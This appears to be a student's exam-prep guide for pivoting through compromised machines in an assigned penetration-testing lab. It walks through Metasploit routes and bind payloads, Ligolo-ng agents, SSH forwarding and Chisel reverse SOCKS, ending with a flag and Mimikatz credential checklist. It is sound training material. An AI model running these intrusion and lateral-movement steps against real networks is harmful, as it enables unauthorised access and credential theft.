# Midterm pivoting guide

Use this only on the machines and networks assigned for the practical exam.

This guide assumes a layout like this:

```text
Kali -> Pivot 1 -> Network 2 -> Pivot 2 -> Network 3 -> final target
```

The basic rule is simple: compromise a machine, find its other network, build a route through it, then repeat.

## Which method should I use?

| Situation | Best choice |
|---|---|
| The exploit already gave you Meterpreter | Metasploit route |
| You expect two or more pivots | Ligolo-ng |
| SSH is running and you have credentials | SSH forwarding |
| You need a quick SOCKS proxy through one machine | Chisel |
| You only need one service on one host | `portfwd` or SSH `-L` |

My exam preference would be:

1. Use the existing Meterpreter session if it is stable.
2. Use Ligolo-ng when Metasploit routing becomes unreliable or when a second pivot appears.
3. Use SSH if the required credentials and service are already available.
4. Use Chisel as a simple one-pivot backup.

## Keep a route table on paper

Fill in one row whenever you compromise a machine.

| Hop | Reachable address | Hidden interface | Hidden subnet | Session or tunnel |
|---|---|---|---|---|
| Kali | `KALI_IP` | | | |
| Pivot 1 | `PIVOT1_OUTSIDE_IP` | `PIVOT1_INSIDE_IP` | `SUBNET_2/24` | `SESSION_1` |
| Pivot 2 | `PIVOT2_NET2_IP` | `PIVOT2_INSIDE_IP` | `SUBNET_3/24` | `SESSION_2` |

Do not add a route to one host. Add the network address. For example, an interface of `10.20.30.40/24` normally means the route is `10.20.30.0/24`.

## First checks on every compromised machine

Windows:

```powershell
whoami
hostname
ipconfig
route print
arp -a
```

Linux:

```bash
id
hostname
ip addr
ip route
ip neigh
```

Look for an interface or route on a network Kali cannot reach directly. That is the next pivot network.

Test likely targets and ports from the compromised Windows machine before blaming the tunnel:

```powershell
Test-NetConnection TARGET_IP -Port 445
Test-NetConnection TARGET_IP -Port 80
Test-NetConnection TARGET_IP -Port 3389
```

If the pivot machine cannot reach the target, changing the tunnel will not fix it.

## Method 1: Metasploit routes

This matches Mid Module Exercise 2.

### Add the first route

Check the interfaces in Meterpreter:

```text
meterpreter > getuid
meterpreter > ipconfig
meterpreter > background
```

Add the hidden subnet through the Meterpreter session:

```text
msf6 > route add SUBNET_2 NETMASK SESSION_1
msf6 > route print
```

Example from the completed exercise:

```text
msf6 > route add 10.20.30.0 255.255.255.0 1
msf6 > route print
```

The longer module form does the same job:

```text
msf6 > use post/multi/manage/autoroute
msf6 post(autoroute) > set SESSION SESSION_1
msf6 post(autoroute) > set CMD add
msf6 post(autoroute) > set SUBNET SUBNET_2
msf6 post(autoroute) > set NETMASK /24
msf6 post(autoroute) > run
```

Manual routes are easier to understand during an exam. Use `autoroute` with `CMD autoadd` only when the subnet is unclear.

### Scan through the route

Start with a short port list. Large scans can stall a Meterpreter session.

```text
msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(portscan/tcp) > set RHOSTS TARGET_IP
msf6 auxiliary(portscan/tcp) > set PORTS 21,22,80,135,139,443,445,3389,5985
msf6 auxiliary(portscan/tcp) > set THREADS 1
msf6 auxiliary(portscan/tcp) > set CONCURRENCY 1
msf6 auxiliary(portscan/tcp) > set TIMEOUT 10000
msf6 auxiliary(portscan/tcp) > run
```

Confirm interesting ports with service-specific Metasploit scanners. Do not run a full version scan until you know the tunnel is stable.

### Get a session on the internal target

A reverse payload on Pivot 2 must call Kali back. That often fails because Pivot 2 has no route to Kali. A bind payload is usually simpler: Kali connects to a listening payload through the existing pivot.

```text
msf6 exploit(...) > show payloads
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/bind_tcp
msf6 exploit(...) > set RHOSTS TARGET_IP
msf6 exploit(...) > set LPORT UNUSED_BIND_PORT
msf6 exploit(...) > run
```

Some command exploits support a bind shell instead:

```text
set PAYLOAD cmd/windows/powershell_bind_tcp
```

Payload compatibility depends on the exploit. Use `show payloads` instead of forcing an incompatible payload.

### Add the second route

Pivot 2 must have a Meterpreter session if you want to use it as another Metasploit route. Inspect its interfaces, background it, and add the next network through its session:

```text
meterpreter > ipconfig
meterpreter > background
msf6 > sessions
msf6 > route add SUBNET_3 NETMASK SESSION_2
msf6 > route print
```

The resulting chain is:

```text
SUBNET_2 -> SESSION_1
SUBNET_3 -> SESSION_2 -> SESSION_1 -> Kali
```

Repeat the focused scan and prefer another bind payload for the next target.

### Use external tools through Metasploit

Metasploit modules use its route table automatically. Other programs need a SOCKS proxy.

```text
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(socks_proxy) > set SRVPORT 1080
msf6 auxiliary(socks_proxy) > set VERSION 5
msf6 auxiliary(socks_proxy) > run -j
msf6 auxiliary(socks_proxy) > jobs
```

Use a small separate ProxyChains configuration such as `proxychains-exam.conf`:

```text
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 10000

[ProxyList]
socks5 127.0.0.1 1080
```

Test one port first:

```bash
proxychains4 -f proxychains-exam.conf nc -vz -w 5 TARGET_IP 445
```

If Nmap is necessary, use TCP connect mode, skip discovery, disable DNS, and scan few ports:

```bash
proxychains4 -f proxychains-exam.conf nmap -sT -Pn -n -p80,445 TARGET_IP
```

In the Exercise 2 environment, the real Nmap binary had Linux file capabilities. Linux secure-execution mode ignored ProxyChains' `LD_PRELOAD`, so Nmap bypassed the proxy and falsely reported filtered ports. If the command prints no ProxyChains connection lines, stop trusting it. Use `nc`, a Metasploit scanner, or Ligolo-ng.

### Single-port Metasploit forwarding

Use this only when you need one known service:

```text
meterpreter > portfwd add -l LOCAL_PORT -p TARGET_PORT -r TARGET_IP
meterpreter > portfwd list
```

Example:

```text
meterpreter > portfwd add -l 8445 -p 445 -r 10.20.30.45
```

Kali now reaches that SMB service at `127.0.0.1:8445`. Port forwarding does not give access to the whole subnet.

## Method 2: Ligolo-ng

Ligolo-ng is my preferred alternative for repeated pivots. It gives Kali a normal TUN interface, so tools do not need ProxyChains. The agent normally runs without administrator rights, but Kali needs permission to create the TUN interface.

Use matching proxy and agent versions. Transfer the correct Linux or Windows agent to each pivot machine before the exam if the rules permit it.

Test the exact binaries against the lab operating systems before the exam. Exercise 2 used Windows 7, and current Ligolo-ng releases have open Windows 7 compatibility reports. Keep Metasploit as the fallback for that VM rather than assuming the newest Ligolo agent will run.

### First pivot

Start the proxy on Kali:

```bash
sudo ./proxy -selfcert
```

In the Ligolo console, create an interface:

```text
ligolo-ng » interface_create --name pivot1
```

Run the agent on Pivot 1:

```powershell
agent.exe -connect KALI_IP:11601 -ignore-cert
```

`-ignore-cert` is acceptable for an isolated exam lab, but it disables certificate verification. For any real assessment, use the proxy certificate fingerprint instead.

Back in the Ligolo console:

```text
ligolo-ng » session
[Agent : PIVOT1] » ifconfig
[Agent : PIVOT1] » tunnel_start --tun pivot1
[Agent : PIVOT1] » interface_add_route --name pivot1 --route SUBNET_2/24
```

Kali can now address hosts on `SUBNET_2` normally:

```bash
ip route
nmap -n -Pn -sT -p80,135,139,445,3389,5985 TARGET_IP
```

Use `-sT` for a TCP connect scan. Ligolo translates connections through its userland network stack, so do not expect every raw-packet scan type to behave like a direct LAN scan.

### Second pivot with Ligolo-ng

Select Pivot 1's agent and make it relay a port to the Ligolo proxy on Kali:

```text
[Agent : PIVOT1] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:11601
[Agent : PIVOT1] » listener_list
```

Run a second agent on Pivot 2. It connects to Pivot 1's hidden address, not directly to Kali:

```powershell
agent.exe -connect PIVOT1_INSIDE_IP:4444 -ignore-cert
```

A second agent should appear in the Ligolo console. Give it a separate interface and route:

```text
ligolo-ng » interface_create --name pivot2
ligolo-ng » session
[Agent : PIVOT2] » ifconfig
[Agent : PIVOT2] » tunnel_start --tun pivot2
[Agent : PIVOT2] » interface_add_route --name pivot2 --route SUBNET_3/24
```

The chain is now:

```text
Kali proxy <- Pivot 1 listener <- Pivot 2 agent -> Network 3
```

Repeat the listener procedure on Pivot 2 if a third pivot is required. Use a new interface name for each agent and confirm every route with `ip route`.

## Method 3: SSH

SSH is the simplest option when a pivot runs SSH and you have credentials.

### SOCKS proxy through one pivot

```bash
ssh -N -o ExitOnForwardFailure=yes -D 127.0.0.1:1080 USER@PIVOT1_IP
```

Point ProxyChains at it:

```text
[ProxyList]
socks5 127.0.0.1 1080
```

Then test a small connection:

```bash
proxychains4 nc -vz -w 5 TARGET_IP 445
```

### Forward one service

```bash
ssh -N -o ExitOnForwardFailure=yes -L 8445:TARGET_IP:445 USER@PIVOT1_IP
```

The target's TCP/445 is now available on Kali at `127.0.0.1:8445`.

### Multiple SSH hops

Open a shell on a target through one jump host:

```bash
ssh -J USER1@PIVOT1_IP USER2@PIVOT2_IP
```

Use two jump hosts:

```bash
ssh -J USER1@PIVOT1_IP,USER2@PIVOT2_IP USER3@TARGET3_IP
```

Create a SOCKS proxy whose connections exit from Pivot 2:

```bash
ssh -N -o ExitOnForwardFailure=yes -D 127.0.0.1:1080 \
  -J USER1@PIVOT1_IP USER2@PIVOT2_IP
```

This only works when the required SSH servers, credentials, and forwarding permissions exist.

## Method 4: Chisel reverse SOCKS

Chisel is useful when Pivot 1 can call Kali but SSH is unavailable. It is a good one-pivot backup. For repeated pivots, Ligolo-ng is easier to reason about.

Current Chisel builds require Windows 10 or Windows Server 2016 and later. The official Chisel documentation recommends version 1.8.1 or earlier for older systems such as the Windows 7 VM used in Exercise 2. Test the older build before relying on it.

Start the reverse-capable server on Kali:

```bash
./chisel server --port 8080 --reverse
```

Run the client on Pivot 1:

```powershell
chisel.exe client KALI_IP:8080 R:socks
```

The default reverse SOCKS listener is `127.0.0.1:1080` on Kali. Configure ProxyChains:

```text
[ProxyList]
socks5 127.0.0.1 1080
```

Test it:

```bash
proxychains4 nc -vz -w 5 TARGET_IP 445
```

Chisel automatically retries its connection, which can make it steadier than a fragile shell. Keep scans focused because every connection still travels through one tunnel.

## Getting flags after each compromise

Do not rush into the next network before finishing the current machine.

For each Windows machine:

1. Record the hostname, user, interfaces, and routes.
2. Check the assigned user's and Administrator's desktop and profile directories.
3. Escalate privileges if required.
4. Collect the required credential or Mimikatz output.
5. Save every flag immediately in your notes with the hostname.
6. Find the next hidden subnet.
7. Build and test the next route.

A simple note format prevents mixing flags between machines:

```text
Host:
IP addresses:
Current user:
Administrator flag:
Credential/Mimikatz flag:
Next subnet:
Pivot method:
```

## Fast troubleshooting

### The route exists but nothing responds

1. Test the target directly from the pivot machine.
2. Recheck the subnet and netmask.
3. Confirm the session or agent still responds.
4. Check that the route points to the correct session or Ligolo interface.
5. Test one known TCP port with a long timeout.

### A reverse payload never connects

The internal target probably cannot route to Kali. Use a bind payload, or use a reverse payload whose callback goes to a reachable pivot listener.

### Meterpreter becomes unresponsive

Stop broad scans. Open a fresh session on a new port if you can, restore only the required route, and use one thread with a short port list. Do not migrate a stable session unless the task requires it.

### ProxyChains shows no chain line

The program may have bypassed ProxyChains. Test with `nc`. If `nc` works but Nmap does not, use a Metasploit scanner or Ligolo-ng.

### Pivot 2 connects, but Network 3 does not

Check Pivot 2's interface and route table. Make sure the route for Network 3 uses Pivot 2's session or TUN interface, not Pivot 1's.

### Two hidden networks use the same address range

Normal routes cannot distinguish identical destination subnets. Use separate local port forwards for the exact services you need, or rebuild the tunnel so only one overlapping route is active at a time.

## Five-minute exam checklist

```text
[ ] Compromise Pivot 1
[ ] Record hostname, user, interfaces, routes, and flags
[ ] Identify SUBNET_2
[ ] Choose Meterpreter route or Ligolo
[ ] Test one target port from Pivot 1
[ ] Add route and confirm it
[ ] Scan a short TCP port list
[ ] Compromise Pivot 2 with a bind payload when needed
[ ] Record Pivot 2 flags before moving on
[ ] Identify SUBNET_3
[ ] Add the second route through Pivot 2
[ ] Repeat until every assigned machine and flag is accounted for
```

## References

- Exercise scope: `..\16. Mid Module exercise 2\mid_module_exercise-lateral_movement.pdf`
- Completed lab method: `..\16. Mid Module exercise 2\mid_module_exercise_lateral_movement_writeup.txt`
- [Rapid7 Metasploit pivoting documentation](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [Ligolo-ng quickstart](https://docs.ligolo.ng/Quickstart/)
- [Ligolo-ng double-pivot guide](https://docs.ligolo.ng/sample/double/)
- [OpenSSH manual](https://man.openbsd.org/ssh)
- [Chisel documentation](https://github.com/jpillora/chisel)
